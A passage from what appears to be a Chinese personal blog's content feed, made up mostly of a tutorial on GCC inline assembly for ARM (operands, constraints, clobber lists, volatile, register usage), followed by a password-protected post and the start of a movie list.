</em>/</p><p>asm(“movr0,r0”);</p><p>该语句的作用是将r0移动到r0中。换句话讲他并不干任何事。典型的就是NOP指令，作用就是短时的延时。</p><p>请接着阅读和学习这篇文档，因为该声明并不像你想象的和其他的C语句一样。内嵌汇编使用汇编指令就像在纯汇编程序中使用的方法一样。可以在一个asm声明中写多个汇编指令。但是为了增加程序的可读性，最好将每一个汇编指令单独放一行。</p><p>asm(</p><p>“mov r0, r0\n\t”</p><p>“mov r0, r0\n\t”</p><p>“mov r0, r0\n\t”</p><p>“mov r0, r0”</p><p>);</p><p>换行符和制表符的使用可以使得指令列表看起来变得美观。你第一次看起来可能有点怪异，但是当C编译器编译C语句的是候，它就是按照上面（换行和制表）生成汇编的。到目前为止，汇编指令和你写的纯汇编程序中的代码没什么区别。但是对比其它的C声明，asm的常量和寄存器的处理是不一样的。通用的内嵌汇编模版是这样的。</p><p>asm(code : output operand list : input operand list : clobberlist);</p><p><strong>汇编和C语句这间的联系是通过上面asm声明中可选的outputoperand list和input operand list</strong>。Clobber list后面再讲。</p><p>下面是将<a href="http://lib.csdn.net/base/c" target="_blank" rel="noopener">c语言</a>的一个整型变量传递给汇编，逻辑左移一位后在传递给C语言的另外一个整型变量。</p><p>/<em> Rotating bits example </em>/</p><p>asm(“mov %[result], %[value], ror #1” :[result] “=r” (y) : [value] “r” (x));</p><p>每一个asm语句被冒号（:）分成了四个部分。</p><p>汇编指令放在第一部分中的“”中间。</p><p>“mov %[result], %[value], ror #1”</p><p>接下来是冒号后的可选择的output operand list，<strong>每一个条目是由一对[]（方括号）和被他包括的符号名组成，它后面跟着限制性字符串，再后面是圆括号和它括着的C变量</strong>。这个例子中只有一个条目。</p><p>[result] “=r” (y)</p><p>接着冒号后面是输入操作符列表，它的语法和输入操作列表一样</p><p>[value] “r” (x)</p><p>破坏符列表，在本例中没有使用</p><p>就像上面的NOP例子，asm声明的4个部分中，<strong>只要最尾部没有使用的部分都可以省略。但是有有一点要注意的是，上面的4个部分中只要后面的还要使用，前面的部分没有使用也不能省略，必须空但是保留冒号</strong>。下面的一个例子就是设置ARMSoc的CPSR寄存器，它有input但是没有output operand。</p><p>asm(“msr cpsr,%[ps]” : : [ps]”r”(status))</p><p>即使汇编代码没有使用，代码部分也要保留空字符串。下面的例子<strong>使用了一个特别的破坏符，目的就是告诉编译器内存被修改过</strong>了。这里的破坏符在下面的优化部分在讲解。</p><p>asm(“”:::”memory”);</p><p><strong>为了增加代码的可读性，你可以使用换行，空格，还有C风格的注释</strong>。</p><p>asm(“mov %[result], %[value], ror#1”</p><p>​           : [result]”=r” (y) /<em>Rotation result. </em>/</p><p>​           : [value]”r” (x) /<em>Rotated value. </em>/</p><p>​           : /<em> No clobbers </em>/</p><p>);</p><p><strong>在代码部分%后面跟着的是后面两个部分方括号中的符号，它指的是相同符号操作列表中的一个条目</strong>。</p><p>%[result]表示第二部分的C变量y，%[value]表示三部分的C变量x；</p><p>符号操作符的名字使用了独立的命名空间。这就意味着它使用的是其他的符号表。简单一点就是说你不必关心使用的符号名在C代码中已经使用了。在早期的C代码中，循环移位的例子必须要这么写：</p><p>asm(“mov %0, %1, ror #1” :”=r” (result) : “r” (value))</p><p>在汇编代码中操作数的引用使用的是%后面跟一个数字，%1代表第一个操作数，%2代码第二个操作数，往后的类推。这个方法目前最新的编译器还是支持的。但是它不便于维护代码。试想一下，你写了大量的汇编指令的代码，要是你想插入一个操作数，那么你就不得不从新修改操作数编号。</p><p>优化C代码</p><p>有两种情况决定了你必须使用汇编。1st，C限制了你更加贴近底层操作硬件，比如，C中没有直接修改程序状态寄存器（PSR）的声明。2nd就是要写出更加优化的代码。毫无疑问GNUC代码优化器做的很好，但是他的结果和我们手工写的汇编代码相差很远。</p><p>这一部分有一点很重要，也是被别人忽视最多的就是：我们在C代码中通过内嵌汇编指令添加的汇编代码，也是要被C编译器的优化器处理的。让我们下面做个试验来看看吧。</p><p>下面是代码实例。</p><p>bigtree@just:~/embedded/basic-C$ arm-<a href="http://lib.csdn.net/base/linux" target="_blank" rel="noopener">linux</a>-gcc -c test.c</p><p>bigtree@just:~/embedded/basic-C$ arm-linux-objdump -D test.o</p><p>编译器选择r3作为循环移位使用。它也完全可以选择为每一个C变量分配寄存器。Load或者store一个值并不显式的进行。下面是其它编译器的编译结果。</p><p>E420A0E1 mov r2, r4, ror #1 @ y, x</p><p>编译器为每一个操作数选择一个相应的寄存器，将操作过的值cache到r4中，然后传递该值到r2中。这个过程你能理解不？</p><p>有的时候这个过程变得更加糟糕。有时候编译器甚至完全抛弃你嵌入的汇编代码。C编译器的这种行为，取决于代码优化器的策略和嵌入汇编所处的上下文。如果在内嵌汇编语句中不使用任何输出部分，那么C代码优化器很有可能将该内嵌语句完全删除。比如NOP例子，我们可以使用它作为延时操作，但是对于编译器认为这影响了程序的执行速速，认为它是没有任何意义的。</p><p>上面的解决方法还是有的。那就是<strong>使用volatile关键字。它的作用就是禁止优化器优化</strong>。将NOP例子修改过后如下：</p><p>/<em> NOP example, revised </em>/</p><p><strong>asm volatile(“movr0, r0”);</strong></p><p>下面还有更多的烦恼等着我们。一个设计精细的优化器可能重新排列代码。看下面的代码：</p><p>i++;</p><p>if (j == 1)</p><p>x += 3;</p><p>i++;</p><p>优化器肯定是要从新组织代码的，两个i++并没有对if的条件产生影响。更进一步的来讲，i的值增加2，仅仅使用一条ARM汇编指令。因而代码要重新组织如下：</p><p>if (j == 1)</p><p>   x += 3;</p><p>i += 2;</p><p>这样节省了一条ARM指令。结果是：这些操作并没有得到许可。</p><p>这些将对你的代码产生很到的影响，这将在下面介绍。下面的代码是c乘b，其中c和b中的一个或者两个可能会被中断处理程序修改。进入该代码前先禁止中断，执行完该代码后再开启中断。</p><p>asm volatile(“mrs r12,cpsr\n\t”</p><p>   “orr r12, r12, #0xC0\n\t”</p><p>   “msr cpsr_c, r12\n\t” ::: “r12”, “cc”);</p><p>c <em>= b; /</em> This may fail. */</p><p>asm volatile(“mrs r12, cpsr\n”</p><p>   “bic r12, r12, #0xC0\n”</p><p>   “msr cpsr_c, r12” ::: “r12”, “cc”);</p><p>但是不幸的是针对上面的代码，优化器决定先执行乘法然后执行两个内嵌汇编，或相反。这样将会使得我们的代码变得毫无意义。</p><p>我们可以使用clobberlist帮忙。上面例子中的clobber list如下：</p><p><strong>“r12”,”cc”</strong></p><p><strong>上面的clobber list将会将向编译器传达如下信息，修改了r12和程序状态寄存器的标志位。Btw，直接指明使用的寄存器，将有可能阻止了最好的优化结果。通常你只要传递一个变量，然后让编译器自己选择适合的寄存器。另外寄存器名，cc（condition registor 状态寄存器标志位），memory都是在clobber list上有效的关键字</strong>。<strong>它用来向编译器指明，内嵌汇编指令改变了内存中的值</strong>。这将强迫编译器在执行汇编代码前存储所有缓存的值，然后在执行完汇编代码后重新加载该值。这将保留程序的执行顺序，因为在使用了带有memory clobber的asm声明后，所有变量的内容都是不可预测的。</p><p>asm volatile(“mrs r12,cpsr\n\t”</p><p>   “orr r12, r12, #0xC0\n\t”</p><p>   “msr cpsr_c, r12\n\t” :: : “r12”, “cc”,”memory”);</p><p>c <em>= b; /</em> This is safe. */</p><p>asm volatile(“mrs r12, cpsr\n”</p><p>   “bic r12, r12, #0xC0\n”</p><p>   “msr cpsr_c, r12” ::: “r12”, “cc”,”memory”);</p><p>使所有的缓存的值都无效，只是局部最优（suboptimal）。你可以有选择性的添加dummyoperand 来人工添加依赖。</p><p>asm volatile(“mrs r12,cpsr\n\t”</p><p>   “orr r12, r12, #0xC0\n\t”</p><p>   “msr cpsr_c, r12\n\t” : “=X” (b) :: “r12”,”cc”);</p><p>c <em>= b; /</em> This is safe. */</p><p>asm volatile(“mrs r12</p><p>上面的第一个asm试图修改变量先b，第二个asm试图修改c。这将保留三个语句的执行顺序，而不要使缓存的变量无效。</p><p>理解优化器对内嵌汇编的影响很重要。如果你读到这里还是云里雾里，最好是在看下个主题之前再把这段文章读几遍^_^。</p><p>Input and output operands</p><p>前面我们学到，每一个input和output operand，由被方括号[]中的符号名，限制字符串，圆括号中的C表达式构成。</p><p>这些限制性字符串有哪些，为什么我们需要他们？你应该知道每一条汇编指令只接受特定类型的操作数。例如：跳转指令期望的跳转目标地址。不是所有的内存地址都是有效的。因为最后的opcode只接受24位偏移。但矛盾的是跳转指令和数据交换指令都希望寄存器中存储的是32位的目标地址。在所有的例子中，C传给operand的可能是函数指针。所以面对传给内嵌汇编的常量、指针、变量，编译器必须要知道怎样组织到汇编代码中。</p><p>对于ARM核的处理器，GCC 4 提供了一下的限制。</p><table><thead><tr><th>Constraint</th><th>Usage in ARM state</th><th>Usage in Thumb state</th></tr></thead><tbody><tr><td>f</td><td>Floating point registers f0 .. f7</td><td>Not available</td></tr><tr><td>G</td><td>Immediate floating point constant</td><td>Not available</td></tr><tr><td>H</td><td>Same a G, but negated</td><td>Not available</td></tr><tr><td>I</td><td>Immediate value in data processing instructionse.g. ORR R0, R0, #operand</td><td>Constant in the range 0 .. 255e.g. SWI operand</td></tr><tr><td>J</td><td>Indexing constants -4095 .. 4095e.g. LDR R1, [PC, #operand]</td><td>Constant in the range -255 .. -1e.g. SUB R0, R0, #operand</td></tr><tr><td>K</td><td>Same as I, but inverted</td><td>Same as I, but shifted</td></tr><tr><td>L</td><td>Same as I, but negated</td><td>Constant in the range -7 .. 7e.g. SUB R0, R1, #operand</td></tr><tr><td>l</td><td>Same as r</td><td>Registers r0..r7e.g. PUSH operand</td></tr><tr><td>M</td><td>Constant in the range of 0 .. 32 or a power of 2e.g. MOV R2, R1, ROR #operand</td><td>Constant that is a multiple of 4 in the range of 0 .. 1020e.g. ADD R0, SP, #operand</td></tr><tr><td>m</td><td>Any valid memory address</td><td></td></tr><tr><td>N</td><td>Not available</td><td>Constant in the range of 0 .. 31e.g. LSL R0, R1, #operand</td></tr><tr><td>o</td><td>Not available</td><td>Constant that is a multiple of 4 in the range of -508 .. 508e.g. ADD SP, #operand</td></tr><tr><td>r</td><td>General register r0 .. r15e.g. SUB operand1, operand2, operand3</td><td>Not available</td></tr><tr><td>W</td><td>Vector floating point registers s0 .. s31</td><td>Not available</td></tr><tr><td>X</td><td>Any operand</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td>= ：Write-only operand, usually used for all output operands+ ：Read-write operand, must be listed as an output operand&amp; ：A register that should be used for output only</td><td></td></tr></tbody></table><p>Output operands必须为write-only，相应C表达式的值必须是左值。Input operands必须为read-only。C编译器是没有能力做这个检查。</p><p>比较严格的规则是：不要试图向input operand写。但是如果你想要使用相同的operand作为input和output。限制性modifier（+）可以达到效果。例子如下：</p><p>asm(“mov %[value], %[value], ror #1” : [value]”+r” (y))</p><p>和上面例子不一样的是，最后的结果存储在input variable中。</p><p>可能modifier + 不支持早期的编译器版本。庆幸的是这里提供了其他解决办法，该方法在最新的编译器中依然有效。<strong>对于input operators有可能使用单一的数字n在限制字符串中。使用数字n可以告诉编译器使用的第n个operand，operand都是以0开始计数</strong>。下面是例子：</p><p>asm(“mov %0, %0, ror #1” : “=r” (value) :”0” (value))</p><p><strong>限制性字符串“0”告诉编译器，使用和第一个output operand使用同样input register。</strong></p><p>请注意，在相反的情况下不会自动实现。如果我没告诉编译器那样做，编译器也有可能为input和output选择相同的寄存器。第一个例子中就为input和output选择了r3。</p><p>在多数情况下这没有什么，但是如果在input使用前output已经被修改过了，这将是致命的。在input和output使用不同寄存器的情况下，你必须使用&amp;modifier来限制outputoperand。下面是代码示例：</p><p>asm volatile(“ldr %0, [%1]””\n\t”</p><p>​             “str %2, [%1, #4]””\n\t”</p><p>​             : “=&amp;r” (rdv)</p><p>​            : “r”(&amp;table), “r” (wdv)</p><p>​             : “memory”);</p><p>在以张表中读取一个值然后在写到该表的另一个位置。</p><p>其他</p><p><strong>内嵌汇编作为预处理宏</strong></p><p>要是经常使用使用部分汇编，最好的方法是将它以宏的形式定义在头文件中。使用该头文件在严格的ANSI模式下会出现警告。为了避免该类问题<strong>，可以使用<strong>asm</strong>代替asm，<strong>volatile</strong>代替volatile</strong>。这可以等同于别名。下面就是个例程：</p><p>#define BYTESWAP(val) \</p><p>   <strong>asm</strong> <strong>volatile</strong> ( \</p><p>​       “eor r3, %1, %1, ror #16\n\t” \</p><p>​       “bic r3, r3, #0x00FF0000\n\t” \</p><p>​       “mov %0, %1, ror #8\n\t” \</p><p>​       “eor %0, %0, r3, lsr #8” \</p><p>​       : “=r” (val) \</p><p>​       : “0”(val) \</p><p>​       : “r3”, “cc” \</p><p>);</p><p><strong>C 桩函数</strong></p><p>宏定义包含的是相同的代码。这在大型routine中是不可以接受的。这种情况下最好定义个桩函数。</p><p>unsigned long ByteSwap(unsigned longval)</p><p>{</p><p>asm volatile (</p><p>​       “eor r3, %1, %1, ror #16\n\t”</p><p>​       “bic r3, r3, #0x00FF0000\n\t”</p><p>​       “mov %0, %1, ror #8\n\t”</p><p>​       “eor %0, %0, r3, lsr #8”</p><p>​       : “=r” (val)</p><p>​       : “0”(val)</p><p>​       : “r3”</p><p>);</p><p>return val;</p><p>}</p><p><strong>替换C变量的符号名</strong></p><p>默认的情况下，GCC使用同函数或者变量相同的符号名。你可以使用asm声明，为汇编代码指定一个不同的符号名</p><p>unsigned long value asm(“clock”) = 3686400</p><p>这个声明告诉编译器使用了符号名clock代替了具体的值。</p><p><strong>替换C函数的符号名</strong></p><p>为了改变函数名，你需要一个原型声明，因为编译器不接受在函数定义中出现asm关键字。</p><p>extern long Calc(void) asm (“CALCULATE”)</p><p>调用函数calc()将会创建调用函数CALCULATE的汇编指令。</p><p><strong>强制使用特定的寄存器</strong></p><p>局部变量可能存储在一个寄存器中。你可以利用内嵌汇编为该变量指定一个特定的寄存器。</p><p>void Count(void) {</p><p>register unsigned char counterasm(“r3”);</p><p>… some code…</p><p>asm volatile(“eor r3, r3,r3”);</p><p>… more code…</p><p>}</p><p>汇编指令“eor r3, r3, r3”，会将r3清零。Waring：该例子在到多数情况下是有问题的，因为这将和优化器相冲突。因为GCC不会预留其它寄存器。要是优化器认为该变量在以后一段时间没有使用，那么该寄存器将会被再次使用。但是编译器并没有能力去检查是否和编译器预先定义的寄存器有冲突。如果你用这种方式指定了太多的寄存器，编译器将会在代码生成的时候耗尽寄存器的。</p><p><strong>临时使用寄存器</strong></p><p>如果你使用了寄存器，而你没有在input或output operand传递，那么你就必须向编译器指明这些。下面的例子中使用r3作为scratch 寄存器，通过在clobber list中写r3，来让编译器得知使用该寄存器。由于ands指令跟新了状态寄存器的标志位，使用cc在clobber list中指明。</p><p>asm volatile(</p><p>   “ands r3, %1, #3” “\n\t”</p><p>   “eor %0, %0, r3” “\n\t”</p><p>   “addne %0, #4”</p><p>   : “=r” (len)</p><p>   : “0” (len)</p><p>   : “cc”, “r3”</p><p> );</p><p>最好的方法是使用桩函数并且使用局部临时变量</p><p>寄存器的用途</p><p>比较好的方法是分析编译后的汇编列表，并且学习C 编译器生成的代码。下面的列表是编译器将ARM核寄存器的典型用途，知道这些将有助于理解代码。</p><table><thead><tr><th>Register</th><th>Alt. Name</th><th>Usage</th></tr></thead><tbody><tr><td>r0</td><td>a1</td><td>First function argumentInteger function resultScratch register</td></tr><tr><td>r1</td><td>a2</td><td>Second function argumentScratch register</td></tr><tr><td>r2</td><td>a3</td><td>Third function argumentScratch register</td></tr><tr><td>r3</td><td>a4</td><td>Fourth function argumentScratch register</td></tr><tr><td>r4</td><td>v1</td><td>Register variable</td></tr><tr><td>r5</td><td>v2</td><td>Register variable</td></tr><tr><td>r6</td><td>v3</td><td>Register variable</td></tr><tr><td>r7</td><td>v4</td><td>Register variable</td></tr><tr><td>r8</td><td>v5</td><td>Register variable=</td></tr><tr><td>r9</td><td>v6</td><td>rfpRegister variableReal frame pointer</td></tr><tr><td>r10</td><td>sl</td><td>Stack limit</td></tr><tr><td>r11</td><td>fp</td><td>Argument pointer</td></tr><tr><td>r12</td><td>ip</td><td>Temporary workspace</td></tr><tr><td>r13</td><td>sp</td><td>Stack pointer</td></tr><tr><td>r14</td><td>lr</td><td>Link register Workspace</td></tr><tr><td>r15</td><td>pc</td><td>Program counter</td></tr></tbody></table></instruction>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LOVE</title>
      <link href="/2019/05/27/LOVE/"/>
      <url>/2019/05/27/LOVE/</url>
      
        <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read." />    <label for="pass">Please enter the password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Movie</title>
      <link href="/2019/05/27/Movie/"/>
      <url>/2019/05/27/Movie/</url>
      
        <content type="html"><![CDATA[<h1 id="To-the-movie"><a href="#To-the-movie" class="headerlink" title="To the movie"></a>To the movie</h1><h2 id="In-the-wanda"><a href="#In-the-wanda" class="headerlink" title="In the wanda"></a>In the wanda</h2><ul><li><h3 id="战狼2"><a href="#战狼2" class="headerlink" title="战狼2"></a>战狼2</h3></li><li><h3 id="空天猎"><a href="#空天猎" class="headerlink" title="空天猎"></a>空天猎</h3></li><li><h3 id="极致追击"><a href="#极致追击" class="headerlink" title="极致追击"></a>极致追击</h3></li><li><h3 id="英伦对决"><a href="#英伦对决" class="headerlink" title="英伦对决"></a>英伦对决</h3></li><li><h3 id="看不见的客人"><a href="#看不见的客人" class="headerlink" title="看不见的客人"></a>看不见的客人</h3></li><li><h3 id="羞羞的铁拳"><a href="#羞羞的铁拳" class="headerlink" title="羞羞的铁拳"></a>羞羞的铁拳</h3></li><li><h3 id="天才枪手"><a href="#天才枪手" class="headerlink" title="天才枪手"></a>天才枪手</h3></li><li><h3 id="王牌特工2：黄金圈"><a href="#王牌特工2：黄金圈" class="headerlink" title="王牌特工2：黄金圈"></a>王牌特工2：黄金圈</h3></li><li><h3 id="银翼杀手2049"><a href="#银翼杀手2049" class="headerlink" title="银翼杀手2049"></a>银翼杀手2049</h3></li><li><h3 id="全球风暴"><a href="#全球风暴" class="headerlink" title="全球风暴"></a>全球风暴</h3></li><li><h3 id="雷神3：诸神黄昏"><a href="#雷神3：诸神黄昏" class="headerlink" title="雷神3：诸神黄昏"></a>雷神3：诸神黄昏</h3></li><li><h3 id="精灵宝可梦：-波尔凯尼恩与机巧的马机雅娜"><a href="#精灵宝可梦：-波尔凯尼恩与机巧的马机雅娜" class="headerlink" title="精灵宝可梦： 波尔凯尼恩与机巧的马机雅娜"></a>精灵宝可梦： 波尔凯尼恩与机巧的马机雅娜</h3></li><li><h3 id="正义联盟"><a href="#正义联盟" class="headerlink" title="正义联盟"></a>正义联盟</h3></li><li><h3 id="恐袭波士顿"><a href="#恐袭波士顿" class="headerlink" title="恐袭波士顿"></a>恐袭波士顿</h3></li><li><h3 id="推理笔记"><a href="#推理笔记" class="headerlink" title="推理笔记"></a>推理笔记</h3></li><li><h3 id="烟花"><a href="#烟花" class="headerlink" title="烟花"></a>烟花</h3></li><li><h3 id="寻梦环游记"><a href="#寻梦环游记" class="headerlink" title="寻梦环游记"></a>寻梦环游记</h3></li><li><h3 id="巨额来电"><a href="#巨额来电" class="headerlink" 